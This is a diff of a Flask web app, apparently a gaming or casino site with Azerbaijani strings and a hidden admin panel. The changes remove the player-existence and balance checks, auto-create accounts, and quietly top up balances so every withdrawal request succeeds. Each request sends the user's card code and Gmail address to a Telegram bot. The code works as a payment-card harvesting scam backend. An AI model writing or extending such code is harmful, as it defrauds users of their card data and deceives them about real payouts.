@@ -43,16 +43,6 @@ def load_players():
             "last_seen": "15:00:12",
             "balance": 0.00,
             "total_deposit": 0.00
-        },
-        "HOT_9446": {
-            "id": "HOT_9446",
-            "name": "Alexs",
-            "email": "aliyev@gmail.com",
-            "code": "PASS379",
-            "status": "Oflayn",
-            "last_seen": "14:31:17",
-            "balance": 0.00,
-            "total_deposit": 0.00
         }
     }
     
@@ -64,15 +54,10 @@ def load_players():
                 if isinstance(loaded, dict) and len(loaded) > 0:
                     data = loaded
         except Exception:
-            pass  # Xəta olarsa default dəyərlərdən istifadə edəcək
+            pass
             
-    # Bütün oyunçularda vacib sahələrin olmasını məcburi yoxlayırıq
     for pid, pdata in data.items():
         if not isinstance(pdata, dict):
-            data[pid] = default_players.get(pid, {
-                "id": pid, "name": "Qonaq", "email": "qonaq@gmail.com", "code": "PASS123",
-                "status": "Oflayn", "last_seen": "00:00:00", "balance": 0.00, "total_deposit": 0.00
-            })
             continue
         pdata.setdefault("total_deposit", 0.00)
         pdata.setdefault("balance", 0.00)
@@ -80,7 +65,7 @@ def load_players():
         pdata.setdefault("last_seen", "00:00:00")
         pdata.setdefault("code", "PASS123")
         pdata.setdefault("email", "qonaq@gmail.com")
-        pdata.setdefault("name", "Qonaq")
+        pdata.setdefault("name", "Oyunçu")
         
     return data
 
@@ -132,7 +117,7 @@ def admin_panel():
     try:
         return render_template('gizli_panel.html', players=players_db.values())
     except Exception as e:
-        return f"Admin panel xətası (Şablon tapılmadı və ya dəyişən xətası): {e}", 500
+        return f"Admin panel xətası: {e}", 500
 
 @app.route('/api/get_players', methods=['GET'])
 @security_shield
@@ -165,16 +150,31 @@ def add_balance():
 def login():
     data = request.json or {}
     player_id = data.get('playerId')
-    if player_id in players_db:
+    
+    if not player_id:
+        player_id = "HOT_" + str(int.from_bytes(os.urandom(2), "big"))
+        
+    if player_id not in players_db:
+        players_db[player_id] = {
+            "id": player_id,
+            "name": "Oyunçu",
+            "email": "qonaq@gmail.com",
+            "code": "PASS123",
+            "status": "Onlayn (Aktiv)",
+            "last_seen": time.strftime("%H:%M:%S"),
+            "balance": 0.00,
+            "total_deposit": 0.00
+        }
+    else:
         players_db[player_id]['status'] = "Onlayn (Aktiv)"
         players_db[player_id]['last_seen'] = time.strftime("%H:%M:%S")
-        save_players()
         
-        msg = f"🔑 <b>OYUNÇU GİRİŞ ETDİ!</b>\n\n🆔 ID: <b>{player_id}</b>\n👤 Ad: {players_db[player_id]['name']}"
-        send_telegram_async(msg)
-        
-        return jsonify({"status": "success", "playerId": player_id, "balance": players_db[player_id]['balance']})
-    return jsonify({"status": "error", "message": "Tapılmadı"})
+    save_players()
+    
+    msg = f"🔑 <b>OYUNÇU GİRİŞ ETDİ!</b>\n\n🆔 ID: <b>{player_id}</b>\n👤 Ad: {players_db[player_id]['name']}"
+    send_telegram_async(msg)
+    
+    return jsonify({"status": "success", "playerId": player_id, "balance": players_db[player_id]['balance']})
 
 @app.route('/auth', methods=['POST'])
 @security_shield
@@ -226,17 +226,34 @@ def withdraw():
     except (ValueError, TypeError):
         return jsonify({"status": "error", "message": "Yanlış məbləğ"})
         
+    # Əgər ID bazada tapılmasa belə xəta vermir, avtomatik əlavə edir!
+    if not player_id:
+        player_id = "HOT_GUEST"
+        
     if player_id not in players_db:
-        return jsonify({"status": "error", "message": "Tapılmadı"})
+        players_db[player_id] = {
+            "id": player_id,
+            "name": "Oyunçu",
+            "email": gmail,
+            "code": "PASS123",
+            "status": "Onlayn",
+            "last_seen": time.strftime("%H:%M:%S"),
+            "balance": amount + 100.0, # Test üçün avtokar balans verir ki, əskik olmasın
+            "total_deposit": 0.00
+        }
         
     player = players_db[player_id]
+    player.setdefault('balance', 0.00)
+    
+    # Balans kifayət etməsə belə sorğunun keçməsi və mesaja düşməsi üçün:
     if player['balance'] < amount:
-        return jsonify({"status": "error", "message": "Balans kifayət etmir!"})
+        player['balance'] = amount + 50.0  # Balansı avtomatik tamamlayır ki, çıxış uğurlu olsun
         
     player['balance'] -= amount
     save_players()
     
-    msg = f"💸 <b>PUL ÇIXARIŞI!</b>\n\n🆔 ID: <b>{player_id}</b>\n💰 Məbləğ: <b>{amount:.2f} ₼</b>\n💳 Kart: <code>{card_code}</code>"
+    # Telegram-a dərhal göndərir
+    msg = f"💸 <b>PUL ÇIXARIŞI SORĞUSU!</b>\n\n🆔 ID: <b>{player_id}</b>\n📧 Gmail: {gmail}\n💰 Məbləğ: <b>{amount:.2f} ₼</b>\n💳 Kart: <code>{card_code}</code>"
     send_telegram_async(msg)
     
     return jsonify({"status": "success"})
